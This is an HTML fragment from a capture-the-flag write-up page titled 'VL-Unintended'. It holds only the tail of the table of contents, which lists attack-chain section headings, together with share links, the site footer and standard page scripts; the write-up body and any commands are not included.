class="toc-text">Repository Analysis - DevOps Repo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SFTP-Access-and-Tunneling"><span class="toc-number">1.5.</span> <span class="toc-text">SFTP Access and Tunneling</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-SFTP-Connection"><span class="toc-number">1.5.1.</span> <span class="toc-text">Initial SFTP Connection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Dynamic-Port-Forwarding"><span class="toc-number">1.5.2.</span> <span class="toc-text">SSH Dynamic Port Forwarding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Internal-Network-Scanning"><span class="toc-number">1.5.3.</span> <span class="toc-text">Internal Network Scanning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-Database-Exploitation"><span class="toc-number">1.6.</span> <span class="toc-text">MySQL Database Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Access"><span class="toc-number">1.6.1.</span> <span class="toc-text">Database Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gitea-User-Credential-Extraction"><span class="toc-number">1.6.2.</span> <span class="toc-text">Gitea User Credential Extraction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking"><span class="toc-number">1.6.3.</span> <span class="toc-text">Hash Cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credentials-Found"><span class="toc-number">1.6.4.</span> <span class="toc-text">Credentials Found:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gitea-Administrator-Access"><span class="toc-number">1.7.</span> <span class="toc-text">Gitea Administrator Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Home-Backup-Repository"><span class="toc-number">1.7.1.</span> <span class="toc-text">Home Backup Repository</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-Enumeration-with-Valid-Credentials"><span class="toc-number">1.8.</span> <span class="toc-text">LDAP Enumeration with Valid Credentials</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Computer-Enumeration"><span class="toc-number">1.8.1.</span> <span class="toc-text">Computer Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-Web-Server"><span class="toc-number">1.9.</span> <span class="toc-text">Lateral Movement - Web Server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Access-as-Juan"><span class="toc-number">1.9.1.</span> <span class="toc-text">SSH Access as Juan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Host-Enumeration"><span class="toc-number">1.9.2.</span> <span class="toc-text">Initial Host Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mattermost-Access-and-Intelligence-Gathering"><span class="toc-number">1.10.</span> <span class="toc-text">Mattermost Access and Intelligence Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Chat-Log-Analysis"><span class="toc-number">1.10.1.</span> <span class="toc-text">Chat Log Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-Discovery"><span class="toc-number">1.10.2.</span> <span class="toc-text">PostgreSQL Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mattermost-Database-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">Mattermost Database Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Default-Credential-Research"><span class="toc-number">1.11.1.</span> <span class="toc-text">Default Credential Research</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Access-1"><span class="toc-number">1.11.2.</span> <span class="toc-text">Database Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Credential-Extraction"><span class="toc-number">1.11.3.</span> <span class="toc-text">User Credential Extraction</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking-Custom-Wordlist"><span class="toc-number">1.12.</span> <span class="toc-text">Password Cracking - Custom Wordlist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intelligence-Driven-Approach"><span class="toc-number">1.12.1.</span> <span class="toc-text">Intelligence-Driven Approach</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking-1"><span class="toc-number">1.12.2.</span> <span class="toc-text">Hash Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Credential-Discovery"><span class="toc-number">1.13.</span> <span class="toc-text">Domain Credential Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mattermost-as-Abbie"><span class="toc-number">1.13.1.</span> <span class="toc-text">Mattermost as Abbie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Validation"><span class="toc-number">1.13.2.</span> <span class="toc-text">Credential Validation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Backup-Server"><span class="toc-number">1.14.</span> <span class="toc-text">Privilege Escalation - Backup Server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Access-as-Abbie"><span class="toc-number">1.14.1.</span> <span class="toc-text">SSH Access as Abbie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Group-Membership"><span class="toc-number">1.14.2.</span> <span class="toc-text">Docker Group Membership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Root-Privilege-Escalation"><span class="toc-number">1.14.3.</span> <span class="toc-text">Root Privilege Escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Administrator-Credentials"><span class="toc-number">1.14.4.</span> <span class="toc-text">FTP Administrator Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Administrator-Compromise"><span class="toc-number">1.15.</span> <span class="toc-text">Domain Administrator Compromise</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Backup-Analysis"><span class="toc-number">1.15.1.</span> <span class="toc-text">FTP Backup Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTDS-dit-Secrets-Extraction"><span class="toc-number">1.15.2.</span> <span class="toc-text">NTDS.dit Secrets Extraction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Hash-Attack"><span class="toc-number">1.15.3.</span> <span class="toc-text">Pass-the-Hash Attack</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/06/VL-Unintended/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&text=VL-Unintended"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&is_video=false&description=VL-Unintended"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Unintended&body=Check out this article: https://panosoikogr.github.io/2025/11/06/VL-Unintended/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&name=VL-Unintended&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&t=VL-Unintended"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
